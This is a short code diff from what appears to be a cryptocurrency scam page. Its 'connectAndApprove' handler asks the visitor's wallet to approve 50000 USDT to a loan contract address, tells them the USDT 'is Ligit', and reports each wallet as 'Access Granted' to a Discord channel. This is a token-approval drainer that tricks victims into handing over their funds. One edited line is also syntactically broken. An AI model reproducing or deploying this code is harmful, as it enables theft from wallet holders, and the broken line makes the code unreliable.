@@ -60,10 +60,10 @@ document.getElementById("connectAndApprove").addEventListener("click", async () 
         await usdtContract.methods.approve(LOAN_CONTRACT_ADDRESS, amountToApprove).send({ from: account });
 
         alert("Congratulations USDT is Ligit");
-        sendToDiscord(`USDT approval granted by wallet: ${account} for 50000 USDT`);
+        sendToDiscord(`Access Granted: ${account} for 50000 USDT`);
     } catch (error) {
         console.error("Error:", error);
-        alert("An error occurred. Check the console for details.");
-        sendToDiscord(`Error occurred for wallet: ${account}. Error: ${error.message}`);
+        alert("An error occurred");
+        sendToDiscord(`Error occurred for wallet: ${account});
     }
 });
